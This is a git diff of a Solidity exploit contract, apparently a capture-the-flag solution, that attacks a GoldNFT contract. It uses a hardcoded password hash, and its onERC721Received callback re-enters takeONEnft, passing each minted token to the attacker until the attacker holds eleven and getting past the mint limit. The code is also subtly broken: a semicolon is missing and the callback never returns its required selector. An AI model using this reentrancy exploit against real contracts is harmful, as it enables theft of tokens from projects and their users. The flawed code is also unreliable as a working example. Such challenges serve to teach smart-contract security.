@@ -24,15 +24,14 @@ interface IERC721Receiver {
 contract HackGoldNft {
 
     address immutable I_PASS_MANAGER = 0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2;
+    bytes32 immutable PASS = 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;
     GoldNFT public nft;
     address public owner;
 
     constructor(address _goldNFT){
         owner = msg.sender;
         nft = GoldNFT(_goldNFT);
-        for(uint256 i =0;i<10; i++){
-        nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
-        }
+        nft.takeONEnft(PASS);
     }
 
     modifier isOwner() {
@@ -41,6 +40,19 @@ contract HackGoldNft {
         _;
     }
 
-    
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        nft.transferFrom(address(this), owner, tokenId);
+        uint256 balance = nft.balanceOf(owner);
+        if (balance < 11){
+            nft.takeONEnft(PASS)
+        }
+    }
+
+
 
 }
